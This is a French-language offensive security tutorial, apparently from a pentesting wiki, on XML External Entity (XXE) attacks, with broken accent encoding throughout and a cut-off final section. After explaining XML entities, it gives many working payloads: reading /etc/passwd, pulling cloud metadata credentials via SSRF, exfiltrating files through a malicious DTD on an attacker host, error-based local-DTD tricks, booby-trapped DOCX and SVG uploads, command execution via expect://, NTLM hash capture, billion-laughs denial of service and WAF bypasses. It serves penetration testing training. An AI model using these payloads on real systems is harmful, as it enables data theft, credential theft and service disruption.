# XXE - XEE - Entit√© Externe XML

Une attaque d'entit√© externe XML est un type d'attaque contre une application qui analyse une entr√©e XML.

## Bases de XML

**La plupart de cette partie a √©t√© prise de cette page Portswigger incroyable:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### Qu'est-ce que XML? <a href="#what-is-xml" id="what-is-xml"></a>

XML signifie "extensible markup language". XML est un langage con√ßu pour stocker et transporter des donn√©es. Comme HTML, XML utilise une structure en arborescence de balises et de donn√©es. Contrairement √† HTML, XML n'utilise pas de balises pr√©d√©finies, les balises peuvent donc √™tre nomm√©es pour d√©crire les donn√©es. Plus t√¥t dans l'histoire du web, XML √©tait √† la mode en tant que format de transport de donn√©es (le "X" dans "AJAX" signifie "XML"). Mais sa popularit√© a maintenant d√©clin√© au profit du format JSON.

### Qu'est-ce que les entit√©s XML? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

Les entit√©s XML sont une fa√ßon de repr√©senter un √©l√©ment de donn√©es dans un document XML, au lieu d'utiliser les donn√©es elles-m√™mes. Diverses entit√©s sont int√©gr√©es √† la sp√©cification du langage XML. Par exemple, les entit√©s `&lt;` et `&gt;` repr√©sentent les caract√®res `<` et `>`. Ce sont des m√©tacaract√®res utilis√©s pour indiquer les balises XML, et doivent donc g√©n√©ralement √™tre repr√©sent√©s √† l'aide de leurs entit√©s lorsqu'ils apparaissent dans les donn√©es.

### Qu'est-ce que les √©l√©ments XML?

Les d√©clarations de type d'√©l√©ment d√©finissent les r√®gles pour le type et le nombre d'√©l√©ments qui peuvent appara√Ætre dans un document XML, les √©l√©ments qui peuvent appara√Ætre √† l'int√©rieur les uns des autres et l'ordre dans lequel ils doivent appara√Ætre. Par exemple:

* `<!ELEMENT stockCheck ANY>` signifie que n'importe quel objet peut √™tre √† l'int√©rieur du parent `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck EMPTY> signifie qu'il doit √™tre vide `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> d√©clare que `<stockCheck>` peut avoir les enfants `<productId>` et `<storeId>`

### Qu'est-ce que la d√©finition de type de document? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

La d√©finition de type de document XML (DTD) contient des d√©clarations qui peuvent d√©finir la structure d'un document XML, les types de valeurs de donn√©es qu'il peut contenir et d'autres √©l√©ments. La DTD est d√©clar√©e dans l'√©l√©ment `DOCTYPE` facultatif au d√©but du document XML. La DTD peut √™tre enti√®rement autonome dans le document lui-m√™me (connue sous le nom de "DTD interne") ou peut √™tre charg√©e √† partir d'ailleurs (connue sous le nom de "DTD externe") ou peut √™tre hybride des deux.

### Qu'est-ce que les entit√©s personnalis√©es XML? <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

XML permet de d√©finir des entit√©s personnalis√©es dans la DTD. Par exemple:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

Cette d√©finition signifie que toute utilisation de la r√©f√©rence d'entit√© `&myentity;` dans le document XML sera remplac√©e par la valeur d√©finie: "`my entity value`".

### Qu'est-ce que les entit√©s externes XML? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

Les entit√©s externes XML sont un type d'entit√© personnalis√©e dont la d√©finition est situ√©e en dehors de la DTD o√π elles sont d√©clar√©es.

La d√©claration d'une entit√© externe utilise le mot cl√© `SYSTEM` et doit sp√©cifier une URL √† partir de laquelle la valeur de l'entit√© doit √™tre charg√©e. Par exemple:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

L'URL peut utiliser le protocole `file://`, et donc les entit√©s externes peuvent √™tre charg√©es √† partir d'un fichier. Par exemple:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

Les entit√©s externes XML fournissent le principal moyen par lequel les attaques d'entit√© externe XML se produisent.

### Qu'est-ce que les entit√©s de param√®tres XML?

Parfois, les attaques XXE √† l'aide d'entit√©s r√©guli√®res sont bloqu√©es en raison d'une validation d'entr√©e par l'application ou d'un durcissement du parseur XML qui est utilis√©. Dans cette situation, vous pourriez √™tre en mesure d'utiliser des entit√©s de param√®tres XML √† la place. Les entit√©s de param√®tres XML sont un type sp√©cial d'entit√© XML qui ne peut √™tre r√©f√©renc√© ailleurs dans la DTD. Pour les pr√©sentes fins, vous n'avez besoin de savoir que deux choses. Premi√®rement, la d√©claration d'une entit√© de param√®tre XML inclut le caract√®re pourcentage avant le nom de l'entit√©:

`<!ENTITY % myparameterentity "my parameter entity value" >`

Et deuxi√®mement, les entit√©s de param√®tres sont r√©f√©renc√©es en utilisant le caract√®re pourcentage au lieu de l'esperluette habituelle: `%myparameterentity;`

Cela signifie que vous pouvez tester les XXE aveugles en utilisant la d√©tection hors bande via des entit√©s de param√®tres XML comme suit:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

Cette charge utile XXE d√©clare une entit√© de param√®tre XML appel√©e `xxe` et utilise ensuite l'entit√© dans la DTD. Cela provoquera une recherche DNS et une requ√™te HTTP vers le domaine de l'attaquant, v√©rifiant que l'attaque a r√©ussi.

## Attaques principales

[La plupart de ces attaques ont √©t√© test√©es √† l'aide des laboratoires XEE impressionnants de Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### Nouveau test d'entit√©

Dans cette attaque, je vais tester si une simple nouvelle d√©claration d'ENTIT√â fonctionne.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Lire un fichier

Essayons de lire `/etc/passwd` de diff√©rentes mani√®res. Pour Windows, vous pouvez essayer de lire : `C:\windows\system32\drivers\etc\hosts`

Dans ce premier cas, notez que SYSTEM "_\*\*file:///\*\*etc/passwd_" fonctionnera √©galement.
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Ce deuxi√®me cas peut √™tre utile pour extraire un fichier si le serveur web utilise PHP (ce n'est pas le cas des laboratoires Portswiggers).
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Dans ce troisi√®me cas, notez que nous d√©clarons l'√©l√©ment `stockCheck` comme √©tant `ANY`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&file;</productId>
    <storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Liste de r√©pertoires

Dans les applications bas√©es sur **Java**, il est possible de **lister le contenu d'un r√©pertoire** via XXE avec une charge utile comme celle-ci (en demandant simplement le r√©pertoire au lieu du fichier):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Une XXE pourrait √™tre utilis√©e pour abuser d'un SSRF dans un cloud.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### SSRF aveugle

En utilisant la **technique pr√©c√©demment comment√©e**, vous pouvez faire en sorte que le serveur acc√®de √† un serveur que vous contr√¥lez pour montrer qu'il est vuln√©rable. Mais si cela ne fonctionne pas, peut-√™tre que les **entit√©s XML ne sont pas autoris√©es**, dans ce cas, vous pouvez essayer d'utiliser les **entit√©s de param√®tres XML** :
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### SSRF "aveugle" - Exfiltrer des donn√©es hors bande

**Dans ce cas, nous allons faire en sorte que le serveur charge une nouvelle DTD avec une charge utile malveillante qui enverra le contenu d'un fichier via une requ√™te HTTP (pour les fichiers multi-lignes, vous pouvez essayer de l'exfiltrer via** _**ftp://**_**). Cette explication est tir√©e du** [**laboratoire Portswiggers ici**](https://portswigger.net/web-security/xxe/blind)**.**

Un exemple de DTD malveillante pour exfiltrer le contenu du fichier `/etc/hostname` est le suivant :
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Cette DTD effectue les √©tapes suivantes :

* D√©finit une entit√© de param√®tre XML appel√©e `file`, contenant le contenu du fichier `/etc/passwd`.
* D√©finit une entit√© de param√®tre XML appel√©e `eval`, contenant une d√©claration dynamique d'une autre entit√© de param√®tre XML appel√©e `exfiltrate`. L'entit√© `exfiltrate` sera √©valu√©e en effectuant une requ√™te HTTP vers le serveur web de l'attaquant contenant la valeur de l'entit√© `file` dans la cha√Æne de requ√™te URL.
* Utilise l'entit√© `eval`, ce qui provoque la d√©claration dynamique de l'entit√© `exfiltrate`.
* Utilise l'entit√© `exfiltrate`, de sorte que sa valeur soit √©valu√©e en demandant l'URL sp√©cifi√©e.

L'attaquant doit ensuite h√©berger la DTD malveillante sur un syst√®me qu'il contr√¥le, g√©n√©ralement en la chargeant sur son propre serveur web. Par exemple, l'attaquant pourrait servir la DTD malveillante √† l'URL suivante :\
`http://web-attaquant.com/malicious.dtd`

Enfin, l'attaquant doit soumettre la charge utile XXE suivante √† l'application vuln√©rable :
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Cette charge utile XXE d√©clare une entit√© de param√®tre XML appel√©e `xxe`, puis utilise l'entit√© dans la DTD. Cela forcera l'analyseur XML √† r√©cup√©rer la DTD externe √† partir du serveur de l'attaquant et √† l'interpr√©ter en ligne. Les √©tapes d√©finies dans la DTD malveillante sont ensuite ex√©cut√©es et le fichier `/etc/passwd` est transmis au serveur de l'attaquant.

### Bas√© sur les erreurs (DTD externe)

**Dans ce cas, nous allons faire en sorte que le serveur charge une DTD malveillante qui affichera le contenu d'un fichier dans un message d'erreur (ceci n'est valable que si vous pouvez voir les messages d'erreur).** [**Exemple √† partir d'ici.**](https://portswigger.net/web-security/xxe/blind)

Vous pouvez d√©clencher un message d'erreur d'analyse XML contenant le contenu du fichier `/etc/passwd` en utilisant une DTD externe malveillante comme suit:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Cette DTD effectue les √©tapes suivantes:

* D√©finit une entit√© de param√®tre XML appel√©e `file`, contenant le contenu du fichier `/etc/passwd`.
* D√©finit une entit√© de param√®tre XML appel√©e `eval`, contenant une d√©claration dynamique d'une autre entit√© de param√®tre XML appel√©e `error`. L'entit√© `error` sera √©valu√©e en chargeant un fichier inexistant dont le nom contient la valeur de l'entit√© `file`.
* Utilise l'entit√© `eval`, ce qui provoque la d√©claration dynamique de l'entit√© `error`.
* Utilise l'entit√© `error`, de sorte que sa valeur est √©valu√©e en tentant de charger le fichier inexistant, ce qui entra√Æne un message d'erreur contenant le nom du fichier inexistant, qui est le contenu du fichier `/etc/passwd`.

Invoquez l'erreur DTD externe avec:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Et vous devriez voir le contenu du fichier √† l'int√©rieur du message d'erreur de la r√©ponse du serveur web.

![](<../.gitbook/assets/image (223) (1).png>)

**Veuillez noter que le DTD externe nous permet d'inclure une entit√© √† l'int√©rieur de la seconde (`eval`), mais cela est interdit dans le DTD interne. Par cons√©quent, vous ne pouvez pas forcer une erreur sans utiliser un DTD externe (g√©n√©ralement).**

### Bas√© sur les erreurs (DTD syst√®me)

Et qu'en est-il des vuln√©rabilit√©s XXE aveugles lorsque les interactions hors bande sont bloqu√©es (les connexions externes ne sont pas disponibles) ? [Informations d'ici](https://portswigger.net/web-security/xxe/blind).

Dans cette situation, il est peut-√™tre encore possible de d√©clencher des messages d'erreur contenant des donn√©es sensibles, en raison d'une faille dans la sp√©cification du langage XML. Si le DTD d'un document utilise un hybride de d√©clarations DTD internes et externes, alors le DTD interne peut red√©finir des entit√©s qui sont d√©clar√©es dans le DTD externe. Lorsque cela se produit, la restriction d'utilisation d'une entit√© de param√®tre XML dans la d√©finition d'une autre entit√© de param√®tre est assouplie.

Cela signifie qu'un attaquant peut utiliser la technique XXE bas√©e sur les erreurs √† partir d'un DTD interne, √† condition que l'entit√© de param√®tre XML qu'il utilise red√©finisse une entit√© qui est d√©clar√©e dans un DTD externe. Bien s√ªr, si les connexions hors bande sont bloqu√©es, alors le DTD externe ne peut pas √™tre charg√© √† partir d'un emplacement distant. Au lieu de cela, il doit s'agir d'un fichier DTD externe qui est local au serveur d'application. Essentiellement, l'attaque consiste √† invoquer un fichier DTD qui se trouve sur le syst√®me de fichiers local et √† le r√©utiliser pour red√©finir une entit√© existante de mani√®re √† d√©clencher une erreur d'analyse contenant des donn√©es sensibles.

Par exemple, supposons qu'il y ait un fichier DTD sur le syst√®me de fichiers du serveur √† l'emplacement `/usr/local/app/schema.dtd`, et que ce fichier DTD d√©finit une entit√© appel√©e `custom_entity`. Un attaquant peut d√©clencher un message d'erreur d'analyse XML contenant le contenu du fichier `/etc/passwd` en soumettant un DTD hybride comme celui-ci :
```markup
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```
Cette DTD effectue les √©tapes suivantes:

* D√©finit une entit√© de param√®tre XML appel√©e `local_dtd`, contenant le contenu du fichier DTD externe qui existe sur le syst√®me de fichiers du serveur.
* Red√©finit l'entit√© de param√®tre XML appel√©e `custom_entity`, qui est d√©j√† d√©finie dans le fichier DTD externe. L'entit√© est red√©finie comme contenant l'exploit XXE bas√© sur les erreurs qui a d√©j√† √©t√© d√©crit, pour d√©clencher un message d'erreur contenant le contenu du fichier `/etc/passwd`.
* Utilise l'entit√© `local_dtd`, de sorte que le DTD externe soit interpr√©t√©, y compris la valeur red√©finie de l'entit√© `custom_entity`. Cela donne le message d'erreur souhait√©.

    **Exemple r√©el:** Les syst√®mes utilisant l'environnement de bureau GNOME ont souvent une DTD √† `/usr/share/yelp/dtd/docbookx.dtd` contenant une entit√© appel√©e `ISOamso`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Comme cette technique utilise un **DTD interne, vous devez d'abord en trouver un valide**. Vous pouvez le faire en **installant** le m√™me **OS / logiciel** que celui utilis√© par le serveur et en **recherchant des DTD par d√©faut**, ou en **r√©cup√©rant une liste** de **DTD par d√©faut** dans les syst√®mes et **v√©rifiant** si l'un d'entre eux existe :
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### Trouver des DTDs dans le syst√®me

Dans le d√©p√¥t Github suivant, vous pouvez trouver des **chemins de DTDs qui peuvent √™tre pr√©sents dans le syst√®me** :

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

De plus, si vous avez l'**image Docker du syst√®me victime**, vous pouvez utiliser l'outil du m√™me d√©p√¥t pour **analyser** l'**image** et **trouver** le chemin des **DTDs** pr√©sents dans le syst√®me. Lisez le [Readme du Github](https://github.com/GoSecure/dtd-finder) pour apprendre comment faire.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

 [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

 [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via les analyseurs de fichiers Office Open XML

(Copi√© d'ici (https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/))\
De nombreuses applications Web vous permettent de t√©l√©charger des documents Microsoft Office, puis elles en extraient certains d√©tails. Par exemple, vous pouvez avoir une application Web qui vous permet d'importer des donn√©es en t√©l√©chargeant une feuille de calcul au format XLSX. √Ä un moment donn√©, pour que l'analyseur extrait les donn√©es de la feuille de calcul, l'analyseur devra **analyser au moins un fichier XML**.

La seule fa√ßon de tester cela est de g√©n√©rer un **fichier Microsoft Office contenant une charge utile XXE**, alors faisons-le. Tout d'abord, cr√©ez un r√©pertoire vide pour d√©compresser votre document, et d√©compressez-le !
```
test$ ls
test.docx
test$ mkdir unzipped
test$ unzip ./test.docx -d ./unzipped/
Archive:  ./test.docx
  inflating: ./unzipped/word/numbering.xml
  inflating: ./unzipped/word/settings.xml
  inflating: ./unzipped/word/fontTable.xml
  inflating: ./unzipped/word/styles.xml
  inflating: ./unzipped/word/document.xml
  inflating: ./unzipped/word/_rels/document.xml.rels
  inflating: ./unzipped/_rels/.rels
  inflating: ./unzipped/word/theme/theme1.xml
  inflating: ./unzipped/[Content_Types].xml
```
Ouvrez `./unzipped/word/document.xml` dans votre √©diteur de texte pr√©f√©r√© (vim) et modifiez le **XML pour y inclure votre charge utile XXE pr√©f√©r√©e**. La premi√®re chose que j'essaie est g√©n√©ralement une requ√™te HTTP, comme ceci:
```
<!DOCTYPE x [ <!ENTITY test SYSTEM "http://[ID].burpcollaborator.net/"> ]>
<x>&test;</x>
```
Ces lignes doivent √™tre ins√©r√©es entre les deux objets XML racine, comme ceci, et bien s√ªr, vous devrez remplacer l'URL par une URL que vous pouvez surveiller pour les requ√™tes:

![Ces lignes doivent √™tre ins√©r√©es entre les deux objets XML racine, comme ceci](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png)

Il ne reste plus qu'√† **compresser le fichier pour cr√©er votre fichier poc.docx malveillant**. √Ä partir du r√©pertoire "d√©compress√©" que nous avons cr√©√© pr√©c√©demment, ex√©cutez ceci:

![√Ä partir du r√©pertoire "d√©compress√©" que nous avons cr√©√© pr√©c√©demment, ex√©cutez ceci:](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png)

Maintenant, t√©l√©chargez le fichier sur votre application web (esp√©rons-le) vuln√©rable et priez les dieux du piratage pour une demande dans vos journaux Burp Collaborator.

### Protocole Jar

Le protocole `jar` n'est disponible que sur les **applications Java**. Il permet d'acc√©der aux fichiers √† l'int√©rieur d'un fichier **PKZIP** (`.zip`, `.jar`, ...) et fonctionne pour les fichiers locaux et distants:
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
√ätre capable d'acc√©der aux fichiers √† l'int√©rieur des fichiers PKZIP est **tr√®s utile pour abuser de XXE via les fichiers DTD syst√®me.** Consultez [cette section pour apprendre √† abuser des fichiers DTD syst√®me](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

#### Dans les coulisses

1. Il effectue une requ√™te HTTP pour charger l'archive zip. `https://download.host.com/myarchive.zip`
2. Il enregistre la r√©ponse HTTP dans un emplacement temporaire. `/tmp/...`
3. Il extrait l'archive.
4. Il lit le `file.zip`
5. Il supprime les fichiers temporaires.

Notez qu'il est possible d'arr√™ter le flux √† la deuxi√®me √©tape. Le truc est de ne jamais fermer la connexion lors de la diffusion du fichier. [Ces outils peuvent √™tre utiles](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) : un en python `slow_http_server.py` et un en java `slowserver.jar`.

Une fois que le serveur a t√©l√©charg√© votre fichier, vous devez trouver son emplacement en parcourant le r√©pertoire temporaire. √âtant al√©atoire, le chemin d'acc√®s au fichier ne peut pas √™tre pr√©dit √† l'avance.

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
L'√©criture de fichiers dans un r√©pertoire temporaire peut aider √† **escalader une autre vuln√©rabilit√© qui implique une travers√©e de chemin d'acc√®s** (comme l'inclusion de fichiers locaux, l'injection de mod√®les, la RCE XSLT, la d√©s√©rialisation, etc.).
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Attaque Billion Laughs
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Attaque Yaml
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Attaque de Gonflement Quadratique

![](<../.gitbook/assets/image (531).png>)

#### Obtenir NTML

Sur les h√¥tes Windows, il est possible d'obtenir le hachage NTML de l'utilisateur du serveur Web en d√©finissant un gestionnaire responder.py :
```
Responder.py -I eth0 -v
```
et en envoyant la requ√™te suivante
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Surfaces XXE Cach√©es

### XInclude

[√Ä partir d'ici.](https://portswigger.net/web-security/xxe)

Certaines applications **re√ßoivent des donn√©es soumises par le client, les int√®grent c√¥t√© serveur dans un document XML, puis analysent le document**. Un exemple de cela se produit lorsque les donn√©es soumises par le client sont plac√©es dans une **requ√™te SOAP backend**, qui est ensuite trait√©e par le service SOAP backend.

Dans cette situation, vous ne pouvez pas effectuer une attaque XXE classique, car **vous ne contr√¥lez pas l'ensemble du XML** et vous ne pouvez donc pas d√©finir ou modifier un √©l√©ment `DOCTYPE`. Cependant, vous pourriez √™tre en mesure d'utiliser `XInclude` √† la place. `XInclude` est une partie de la sp√©cification XML qui permet de construire un document XML √† partir de sous-documents. Vous pouvez placer une attaque `XInclude` dans n'importe quelle valeur de donn√©es dans un document XML, de sorte que l'attaque peut √™tre effectu√©e dans des situations o√π vous ne contr√¥lez qu'un seul √©l√©ment de donn√©es qui est plac√© dans un document XML c√¥t√© serveur.

Pour effectuer une attaque `XInclude`, vous devez faire r√©f√©rence √† l'espace de noms `XInclude` et fournir le chemin d'acc√®s au fichier que vous souhaitez inclure. Par exemple:
```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
### SVG - T√©l√©chargement de fichiers

[√Ä partir d'ici.](https://portswigger.net/web-security/xxe)

Certaines applications permettent aux utilisateurs de t√©l√©charger des fichiers qui sont ensuite trait√©s c√¥t√© serveur. Certains formats de fichiers courants utilisent XML ou contiennent des sous-composants XML. Des exemples de formats bas√©s sur XML sont les formats de documents de bureau tels que DOCX et les formats d'image tels que SVG.

Par exemple, une application pourrait permettre aux utilisateurs de **t√©l√©charger des images**, et de les traiter ou de les valider sur le serveur apr√®s leur t√©l√©chargement. M√™me si l'application s'attend √† recevoir un format comme PNG ou JPEG, la **biblioth√®que de traitement d'images qui est utilis√©e pourrait prendre en charge les images SVG**. √âtant donn√© que le format SVG utilise XML, un attaquant peut soumettre une image SVG malveillante et ainsi atteindre une surface d'attaque cach√©e pour les vuln√©rabilit√©s XXE.
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Vous pouvez √©galement essayer d'**ex√©cuter des commandes** en utilisant l'enveloppeur PHP "expect" :
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```
**Notez que la premi√®re ligne du fichier lu ou du r√©sultat de l'ex√©cution appara√Ætra √Ä L'INT√âRIEUR de l'image cr√©√©e. Vous devez donc √™tre en mesure d'acc√©der √† l'image que SVG a cr√©√©e.**

### **PDF - T√©l√©chargement de fichiers**

Lisez le post suivant pour **apprendre √† exploiter une XXE en t√©l√©chargeant un fichier PDF** :

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type : De x-www-urlencoded √† XML

Si une requ√™te POST accepte les donn√©es au format XML, vous pouvez essayer d'exploiter une XXE dans cette requ√™te. Par exemple, si une requ√™te normale contient ce qui suit :
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Alors vous pourriez √™tre en mesure de soumettre la demande suivante, avec le m√™me r√©sultat:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON √† XEE

Pour modifier la requ√™te, vous pouvez utiliser une extension Burp appel√©e "**Content Type Converter**". [Ici](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html), vous pouvez trouver cet exemple :
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```
Un autre exemple peut √™tre trouv√© [ici](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Contournement des WAF et des protections

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Cela ne fonctionne que si le serveur XML accepte le protocole `data://`.

### UTF-7

Vous pouvez utiliser la \[**"Recette d'encodage**" de CyberChef ici ]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) pour transformer en UTF-7.
```markup
<!xml version="1.0" encoding="UTF-7"?-->
